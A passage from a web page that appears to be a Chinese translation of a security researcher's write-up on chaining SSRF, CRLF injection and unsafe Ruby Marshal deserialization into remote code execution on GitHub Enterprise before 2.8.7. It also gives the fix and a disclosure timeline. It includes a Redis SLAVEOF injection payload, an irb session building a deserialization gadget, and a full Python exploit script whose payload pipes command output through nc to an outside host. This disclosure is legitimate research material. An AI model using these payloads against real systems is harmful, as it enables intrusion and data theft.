+url=http://127.0.0.1:6379/%0ASLAVEOF%20orange.tw%206379%0A</pre><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">注:Redis的slaveof命令可以允许我们使用带外数据，当你用户到某些Blind-SSRF时这种技巧是非常实用的。</span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">不过，在可利用的协议方面还是存在有很多的限制：</span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">1.像SSH、MySQL和SSL这种需要进行握手的协议将会失效；</span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">2.由于Python2的原因，我们在第二个SSRF中所使用的Payload只允许0x00到0x8F字节的数据。</span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">顺便提一下，我们还有很多利用HTTP协议的方法。在我的演讲幻灯片中，我还演示了如何使用Linux Glibc来修改SSL协议。除此之外，你也可以参考漏洞CVE-2016-5699！如果你感兴趣的话...</span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">第四个漏洞-不安全的反序列化</span></strong></span></p><hr/><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">目前为止，我们已经能够在HTTP协议中利用其他的协议或嵌入Payload了，但是接下来的问题就是，我应该选择哪一个协议呢？如果我能够控制Redis或Memcached的话，我能够触发哪一个漏洞呢？</span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">我花了很多时间来弄清楚上面这些问题，在检查相关源代码的过程中，我比较想知道GitHub为什么会在Memcached中存储Ruby对象。在研究了一阵子之后，我发现GitHub Enterprise使用RubyGem mecached来处理缓存，而缓存的封装是通过Marshal实现的。这就非常棒了，因为所有人都知道Marshal是非常危险的，所以我们接下来的目标就非常清晰了。</span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">我准备使用之前的SSRF漏洞执行链在Memcached中存储恶意Ruby对象。当GitHub下一次获取缓存时，RubyGem memcached将会自动对数据进行反序列化操作，而结果就是...要爆炸！！因为我们在GitHub上实现了远程代码执行（RCE）。</span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">Rails控制台中不安全的Marshal：</span></p><p style="white-space: normal;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">irb(main):001:0&gt;&nbsp;GitHub.cache.class.superclass
+=&gt;&nbsp;Memcached::Rails
+irb(main):002:0&gt;&nbsp;GitHub.cache.set(&quot;nogg&quot;,&nbsp;&quot;hihihi&quot;)
+=&gt;&nbsp;true
+irb(main):003:0&gt;&nbsp;GitHub.cache.get(&quot;nogg&quot;)
+=&gt;&nbsp;&quot;hihihi&quot;
+irb(main):004:0&gt;&nbsp;GitHub.cache.get(&quot;nogg&quot;,&nbsp;:raw=&gt;true)
+=&gt;&nbsp;&quot;\x04\bI\&quot;\vhihihi\x06:\x06ET&quot;
+irb(main):005:0&gt;&nbsp;code&nbsp;=&nbsp;&quot;`id`&quot;
+=&gt;&nbsp;&quot;`id`&quot;
+irb(main):006:0&gt;&nbsp;payload&nbsp;=&nbsp;&quot;\x04\x08&quot;&nbsp;+&nbsp;&quot;o&quot;+&quot;:\x40ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy&quot;+&quot;\x07&quot;&nbsp;+&nbsp;&quot;:\x0E@instance&quot;&nbsp;+&nbsp;&quot;o&quot;+&quot;:\x08ERB&quot;+&quot;\x07&quot;&nbsp;+&nbsp;&quot;:\x09@src&quot;&nbsp;+&nbsp;Marshal.dump(code)[2..-1]&nbsp;+&nbsp;&quot;:\x0c@lineno&quot;+&nbsp;&quot;i\x00&quot;&nbsp;+&nbsp;&quot;:\x0C@method&quot;+&quot;:\x0Bresult&quot;
+=&gt;
+&quot;\u0004\bo:@ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy\a:\u000E@instanceo:\bERB\a:\t@srcI\&quot;\t`id`\u0006:\u0006ET:\f@linenoi\u0000:\f@method:\vresult&quot;
+irb(main):007:0&gt;&nbsp;GitHub.cache.set(&quot;nogg&quot;,&nbsp;payload,&nbsp;60,&nbsp;:raw=&gt;true)
+=&gt;&nbsp;true
+irb(main):008:0&gt;&nbsp;GitHub.cache.get(&quot;nogg&quot;)
+=&gt;&nbsp;&quot;uid=0(root)&nbsp;gid=0(root)&nbsp;groups=0(root)\n&quot;</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">没错，就是这样。现在我们重新梳理一下整个过程：</span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">1.第一个SSRF漏洞，可以绕过WebHook中现有的保护机制。</span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">2.第二个SSRF漏洞，存在于Graphite服务之中。</span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">3.结合第一个和第二个SSRF漏洞，组成SSRF漏洞执行链。</span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">4.SSRF执行链中的CR-LF注入。</span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">5.利用Memcached协议，注入恶意Marshal对象。</span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">6.触发远程代码执行。</span></p><p style="white-space: normal; text-align: center;"><img src="http://p4.qhimg.com/t01385c4a3784c3aaaf.png" title="t013d0533a9fd7a451b.png" alt="http://p8.qhimg.com/t013d0533a9fd7a451b.png"/></p><p style="white-space: normal; text-indent: 2em;"><br/></p><p style="white-space: normal; text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">漏洞利用代码</span></strong></span></p><hr/><pre class="brush:plain;toolbar:false">#!/usr/bin/python
+&nbsp;from&nbsp;urllib&nbsp;import&nbsp;quote
+&nbsp;&nbsp;&nbsp;&#39;&#39;&#39;&nbsp;set&nbsp;up&nbsp;the&nbsp;marshal&nbsp;payload&nbsp;from&nbsp;IRB
+&nbsp;code&nbsp;=&nbsp;&quot;`id&nbsp;|&nbsp;nc&nbsp;orange.tw&nbsp;12345`&quot;
+&nbsp;p&nbsp;&quot;\x04\x08&quot;&nbsp;+&nbsp;&quot;o&quot;+&quot;:\x40ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy&quot;+&quot;\x07&quot;&nbsp;+&nbsp;&quot;:\x0E@instance&quot;&nbsp;+&nbsp;&quot;o&quot;+&quot;:\x08ERB&quot;+&quot;\x07&quot;&nbsp;+&nbsp;&quot;:\x09@src&quot;&nbsp;+&nbsp;Marshal.dump(code)[2..-1]&nbsp;+&nbsp;&quot;:\x0c@lineno&quot;+&nbsp;&quot;i\x00&quot;&nbsp;+&nbsp;&quot;:\x0C@method&quot;+&quot;:\x0Bresult&quot;
+&nbsp;&#39;&#39;&#39;
+&nbsp;marshal_code&nbsp;=&nbsp;&#39;\x04\x08o:@ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy\x07:\x0e@instanceo:\x08ERB\x07:\t@srcI&quot;\x1e`id&nbsp;|&nbsp;nc&nbsp;orange.tw&nbsp;12345`\x06:\x06ET:\x0c@linenoi\x00:\x0c@method:\x0bresult&#39;
+&nbsp;&nbsp;&nbsp;payload&nbsp;=&nbsp;[
+&nbsp;&#39;&#39;,
+&nbsp;&#39;set&nbsp;githubproductionsearch/queries/code_query:857be82362ba02525cef496458ffb09cf30f6256:v3:count&nbsp;0&nbsp;60&nbsp;%d&#39;&nbsp;%&nbsp;len(marshal_code),
+&nbsp;marshal_code,
+&nbsp;&#39;&#39;,
+&nbsp;&#39;&#39;
+&nbsp;]
+&nbsp;&nbsp;&nbsp;payload&nbsp;=&nbsp;map(quote,&nbsp;payload)
+&nbsp;url&nbsp;=&nbsp;&#39;http://0:8000/composer/send_email?to=orange@chroot.org&amp;url=http://127.0.0.1:11211/&#39;
+&nbsp;&nbsp;&nbsp;print&nbsp;&quot;\nGitHub&nbsp;Enterprise&nbsp;&lt;&nbsp;2.8.7&nbsp;Remote&nbsp;Code&nbsp;Execution&nbsp;by&nbsp;orange@chroot.org&quot;
+&nbsp;print&nbsp;&#39;-&#39;*10&nbsp;+&nbsp;&#39;\n&#39;
+&nbsp;print&nbsp;url&nbsp;+&nbsp;&#39;%0D%0A&#39;.join(payload)
+&nbsp;print&nbsp;&#39;&#39;&#39;
+&nbsp;Inserting&nbsp;WebHooks&nbsp;from:
+&nbsp;https://ghe-server/:user/:repo/settings/hooks
+&nbsp;&nbsp;&nbsp;Triggering&nbsp;RCE&nbsp;from:
+&nbsp;https://ghe-server/search?q=ggggg&amp;type=Repositories
+&nbsp;&#39;&#39;&#39;</pre><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span><br/></p><p style="white-space: normal; text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">漏洞修复</span></strong></span></p><hr/><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">GitHub采取了以下措施来防止相关问题再次发生，并提升了网站安全性：</span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">1.增强了Gem faraday-restrict-ip-addresses；</span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">2.采用了自定义的Django中间件来确保攻击者无法从外部访问http://127.0.0.1:8000/render/；</span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">3.增强了iptables规则；</span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">$&nbsp;cat&nbsp;/etc/ufw/before.rules
+...
+-A&nbsp;ufw-before-input&nbsp;-m&nbsp;multiport&nbsp;-p&nbsp;tcp&nbsp;!&nbsp;--dports&nbsp;22,23,80,81,122,123,443,444,8080,8081,8443,8444&nbsp;-m&nbsp;recent&nbsp;--tcp-flags&nbsp;PSH,ACK&nbsp;PSH,ACK&nbsp;--remove&nbsp;-m&nbsp;string&nbsp;--algo&nbsp;bm&nbsp;--string&nbsp;&quot;User-Agent:&nbsp;GitHub-Hookshot&quot;&nbsp;-j&nbsp;REJECT&nbsp;--reject-with&nbsp;tcp-reset
+...</pre><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span><br/></p><p style="white-space: normal; text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">时间轴</span></strong></span></p><hr/><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">2017年01月23日23:22：通过HackerOne将漏洞上报给GitHub，报告编号为200542；</span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">2017年01月23日23:37：GitHub将报告状态修改为已分类；</span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">2017年01月24日04:43：GitHub确认了漏洞，并表示正在修复相关问题；</span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">2017年01月31日14:01：GitHub Enterprise 2.8.7发布；</span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">2017年02月01日01:02：GitHub回复称漏洞已成功修复；</span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">2017年02月01日01:02：GitHub提供了7500美刀的漏洞奖金；</span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">2017年03月15日02:38：GitHub又提供了5000美金的年度最佳漏洞报告奖励；</span></p></p>
+                <hr/>
+                <p style="text-align: center;">
+                    <img src="http://bobao.360.cn/img/app.jpeg"/>
+                    <img src="http://bobao.360.cn/img/weixin.jpeg"/>
+                </p>
+                                <p>本文由 安全客 翻译，转载请注明“转自安全客”，并附上链接。<br/><a class="text-more" href="http://blog.orange.tw/2017/07/how-i-chained-4-vulnerabilities-on.html" target="_blank">原文链接：http://blog.orange.tw/2017/07/how-i-chained-4-vulnerabilities-on.html</a></p>
+                            </div>
+            <div style="margin-top: 20px;background-color:#FFFFFF">
+    <input type="hidden" id="detail_title" name="detail_title" value="【Blackhat】从SSRF执行链到RCE，看我如何利用GitHub企业版中的四个漏洞 - 安全客 - 有思想的安全新媒体" />
+    <input type="hidden" id="use_nickname" name="use_nickname" value="0" />
+    <a name="mao"></a>
+    <div class="reg-log mobile-hiden">
+        <div class="" id="userTo">   
+            <div id="to-list" class="input-text" style="">
+                <textarea disabled="disabled" class="hide"  id="comment-content" to="to"></textarea>
+                <ul id="preadded" style="display:none">       
+                </ul>
+                <div id="to-auto" style="width: 200px">
+                    <ul id="feed">
+                    </ul>
+                </div>
+            </div>
+        </div>
+        <input type="hidden" id="source-id" value="4176" />
+        <input type="hidden" id="source-type" value="learning" />
+        <input type="hidden" id="post-comment-url" value="/comment/add" />
+        <input type="hidden" id="post-nickname-url-ajax" value="/comment/randnicknameajax" />
+        <input type="hidden" id="post-check-login-url-ajax" value="/comment/checklogin" />
+        <input type="hidden" id="stoken_comment_set" value="ea3898fb4df38673fdeb61c458234054">                 <span class="join">参与讨论，请先 <a href="javascript:;" class="comment-login">登录</a> | <a href="javascript:;" class="comment-reg">注册</a> |  <a href="javascript:;" class="anonymous-comment">匿名评论</a></span>
+            </div>
+    <div class="mobile-hide" style="width: 870px; margin: 0 auto;">
+        <label style="vertical-align:middle;" for="use_nickname">匿名</label> 
+        <input style="vertical-align:middle;" id="trigger-nickname" name="use_nickname" class="use_nickname" type="checkbox" value="0" />
+
+        <a href="javascript:;" class="apply-use button" id="submit-comment" data-target="/comment/add">发布</a>
+    </div>
+
+
+    <div class="clearfix"></div>
+    <div class="comments">
+        <div class="comments-head">
+            <span class="title">用户评论</span>
+        </div>
+                <div class="comment">
+    <div class="avatar">
+        <a href="javascript:;">
+                                    <img src="/img/photo/7x48x48.png">
+                    </a>
+    </div>
+    <div class="comment-main">
+        <div class="comment-user">
+                        <a user-id="0" class="response" data-bind-id="0" data-target="15721" user-name="吃瓜群众" href="javascript:;">
+                吃瓜群众            </a>
+                        <span class="comment-time">2017-08-08 10:25:25</span>
+            <div class="comment-action">
+                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="15721">回复</a></span>&nbsp;|&nbsp;
+                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_15721" data-type="comment">点赞</a></span>
+            </div>
+        </div>
+
+        <p class="content">url=http://127.0.0.1:12345/%0D%0Ai_am_payload%0D%0AFoo: //第三个漏洞 poc这个url参数怎么变成127.0.10.1了？</p>
+        <style>
+    .comment-user p{font-size: 13px; margin: 0;}
+</style>
+    </div>
+    <div>
+
+    </div>
+</div>
+<div class="clearfix"></div>
+<div class="comment">
+    <div class="avatar">
+        <a href="javascript:;">
+                                    <img src="/img/photo/1x48x48.png">
+                    </a>
+    </div>
+    <div class="comment-main">
+        <div class="comment-user">
+                        <a user-id="0" class="response" data-bind-id="0" data-target="15580" user-name="77ca1k1k1" href="javascript:;">
+                77ca1k1k1            </a>
+                        <span class="comment-time">2017-07-31 23:01:26</span>
+            <div class="comment-action">
+                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="15580">回复</a></span>&nbsp;|&nbsp;
+                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_15580" data-type="comment">点赞</a></span>
+            </div>
+        </div>
+
+        <p class="content">来自台湾的orange大佬哇</p>
+        <style>
+    .comment-user p{font-size: 13px; margin: 0;}
+</style>
+    </div>
+    <div>
+
+    </div>
+</div>
+<div class="clearfix"></div>
+
+        <a class="more-long comment-more" href="javascript:;" data-target="/comment/more" data-type="learning" data-source-id="4176" data-page="2">查看更多</a>
+            </div>
+</div>
+<script>
+    $(function () {
+        $('.anonymous-comment').click(function () {
+            $(".join").hide();
+            $(".reg-log textarea").first().removeAttr("disabled").show();
+            $('#use_nickname').val('1');
+//            $('#trigger-nickname').attr('checked', true);
+            $('#trigger-nickname').trigger('click');
+        });
+        //为所有复选框绑定事件
+//        checkbox_on_click();
+        //ajax随机获取昵称
+//        randnicknameajax(0);
+        //ajax检测登录状态
+        comment_check_login();
+    });
+
+
+
+    function input_checkbox(flag) {
+        $('input:checkbox').each(function () {
+            var value = flag ? 1 : 0;
+            $(this).prop('checked', flag);
+            $(this).val(value);
+        });
+    }
+
+//ajax随机获取昵称
+    function randnicknameajax(flag) {
+        $.ajax({
+            type: 'POST',
+            url: $('#post-nickname-url-ajax').val(),
+            data: {limit: 1, flag: flag},
+            dataType: "json",
+            success: function (data) {
+                $('#nick-name').val(data.data[0]);
+                _nick_name=data.data[0];
+            }
+        });
+    }
+    $();
+//ajax检测登录状态
+    function comment_check_login() {
+        $.ajax({
+            type: 'POST',
+            url: $('#post-check-login-url-ajax').val(),
+            data: {},
+            dataType: "json",
+            success: function (data) {
+                if (data.success) {
+                    $('.join').hide();
+                    $(".reg-log textarea").first().removeAttr("disabled").show();
+                    $("#span_use_nickname").show();
+                    $('#use_nickname').val('0');
+                    $('#use_nickname').attr('checked', false);
+                }
+            }
+        });
+    }
+</script>        </div>
+    </div>
+    <div class="side-bar">
+        <div class="mod hot-news">
+    <div class="head-bar clearfix">
+        <h2><i class="icon icon-hot"></i><span>热门知识</span></h2>
+    </div>
+    <ul class="links-list">
+                                <li><a href="/learning/detail/4411.html" alt="【漏洞预警】一个换行符引发的奥斯卡0day漏洞(CVE-2017-8759)重现——最新的Office高级威胁攻击预警" target="_blank">【漏洞预警】一个换行符引发的奥斯卡...</a></li>
+                                <li><a href="/learning/detail/4416.html" alt="【漏洞预警】Microsoft .NET Framework漏洞（CVE–2017–8759）预警" target="_blank">【漏洞预警】Microsoft .NE...</a></li>
+                                <li><a href="/learning/detail/4414.html" alt="【技术分享】妙用JavaScript绕过XSS过滤" target="_blank">【技术分享】妙用JavaScrip...</a></li>
+                                <li><a href="/learning/detail/4418.html" alt="【技术分享】利用威胁情报数据平台拓展APT攻击线索一例" target="_blank">【技术分享】利用威胁情报数据平台拓...</a></li>
+                                <li><a href="/learning/detail/4417.html" alt="【知识】9月15日 - 每日安全知识热点" target="_blank">【知识】9月15日 - 每日安全知识热...</a></li>
+                                <li><a href="/learning/detail/4425.html" alt="【安全报告】XShellGhost事件技术回顾报告" target="_blank">【安全报告】XShellGhost事件...</a></li>
+            </ul>
+</div>        <!-- 友情链接 -->
+        <div class="mod blog-links mobile-hide">
+    <div class="head-bar clearfix">
+        <h2><i class="icon icon-link"></i><span>友情链接</span></h2>
+        <a href="/links/index.html" class="more">更多<i></i></a>
+    </div>
+        <ul class="links-list">
+                <li><a href="http://bbs.360safe.com" alt="360安全社区" target="_blank">360安全社区</a></li>
+                <li><a href="http://zhuji.360.cn" alt="360主机卫士" target="_blank">360主机卫士</a></li>
+                <li><a href="http://blogs.360.cn/" alt="奇虎360技术博客" target="_blank">奇虎360技术博客</a></li>
+                <li><a href="http://wangzhan.360.cn/" alt="360网站卫士" target="_blank">360网站卫士</a></li>
+                <li><a href="http://webscan.360.cn/" alt="360网站安全检测" target="_blank">360网站安全检测</a></li>
+                <li><a href="http://research.360.cn/report/" alt="360研究报告" target="_blank">360研究报告</a></li>
+                <li><a href="http://unicorn.360.cn/" alt="360 Unicorn Team" target="_blank">360 Unicorn Team</a></li>
+                <li><a href="http://appscan.360.cn/" alt="360捉虫猎手" target="_blank">360捉虫猎手</a></li>
+                <li><a href="https://threathunter.org/" alt="ThreatHunter社区" target="_blank">ThreatHunter社区</a></li>
+                <li><a href="http://security.360.cn/" alt="360安全应急响应中心" target="_blank">360安全应急响应中心</a></li>
+            </ul>
+    </div>
+        <!-- 联系我们 -->
+        <div class="mod contact mobile-hide" style="text-align:center">
+    <div class="head-bar clearfix">
+        <h2><i></i><span>关注我们</span></h2>
+    </div>
+    <!-- 微信关注 -->
+    <ul class="contact-way">
+        <li><a>微信关注</a></li>
+    </ul>
+    <div style="padding-left:20px;padding-bottom:15px;">
+    <img src="/img/qrcode_adlab_weixin.png?v=1.1"  width="145px" height="145px;"/>
+    </div>
+    
+    <!-- APP下载 -->
+    <ul class="contact-way">
+        <li><a>安全播报APP</a></li>
+    </ul>
+    <div style="padding-left:20px;padding-bottom:15px;">
+    <img src="/img/scan_code_big.png?v=1.1"  width="145px" height="145px;"/>
+    </div>
+    
+</div>
+
+    </div>
+</div>
+
+<script type="text/javascript" src="/js/jquery-ui.min.js?v=3.0"></script>
+<script type="text/javascript" src="/js/jquery.noty.packaged.min.js?v=3.0"></script>
+<script type="text/javascript" src="/js/common.js?v=4.5"></script>
+<script>$(function() {sync_count('comment');});</script>
+
+
+<!-- 语法高亮 -->
+<script type="text/javascript" src="/ue/SyntaxHighlighter/shCore.js"></script>
+<script type="text/javascript">SyntaxHighlighter.all();sync_count('vul');sync_count('news');sync_count('learning');sync_count('activity');sync_count('course');sync_count('ctf');</script>
+    </div>
+
+        <div class="footer">
+        <div class="friend-link">
+            <a href="http://www.360.cn/" target="_blank">360首页</a>
+            <span>|</span>
+            <a href="/introduce/index" target="_blank">关于我们</a>
+            <span>|</span>
+            <a href="/introduce/index" target="_blank">联系我们</a>
+            <span>|</span>
+            <a href="/links/index.html" target="_blank">友情链接</a>
+            <span>|</span>
+            <a href="/introduce/index" target="_blank">招贤纳士</a>
+        </div>
+        <div class="copy">
+            Copyright &copy; 360网络攻防实验室 All Rights Reserved <span class="copy_icp">京ICP证080047号[京ICP备08010314号-6]</span>
+        </div>
+    </div>
+    
+</div>
+
+<!--奇舞团统计-->
+
+<script src='https://s.ssl.qhimg.com/static/f5407c785655e6a1/monitor_analytic.js'></script>
+<script>
+    monitor.setProject('QH_171_1').getTrack().getClickAndKeydown().getClickHeatmap(10, 1);
+</script>
+
+<div class="hide">
+    <script src="https://s95.cnzz.com/z_stat.php?id=1253147824&web_id=1253147824" language="JavaScript"></script>
+</div>
+<div class="backToTop_wrap off">
+    <a id="back_to_top" class="backToTop" href="javascript:;" title="返回顶部"></a>
+</div>
+<script>
+    var $backToTop_wrap = $(".backToTop_wrap"),
+        $backToTop_btn = $("#back_to_top");
+
+    if ($(window).scrollTop() > 100) {
+        $backToTop_wrap.removeClass("off");
+    }
+    else {
+        $backToTop_wrap.addClass("off");
+    }
+
+    $(window).on("scroll", function () {
+        if ($(this).scrollTop() > 100) {
+            $backToTop_wrap.removeClass("off");
+        }
+        else {
+            $backToTop_wrap.addClass("off");
+        }
+    });
+
+    $backToTop_btn.on("click", function () {
+        $("html, body").animate({scrollTop: 0}, 120);
+    });
+
+    $(function () {
+        var navlist = $('.nav-list > li');
+
+        navlist.each(function () {
+            $(this).on('mouseenter', function () {
+                $(this).addClass('selected');
+            });
+
+            $(this).on('mouseleave', function () {
+                $(this).removeClass('selected');
+            });
+        });
+    })
+</script>
+
+
+
+</body>
+</html>
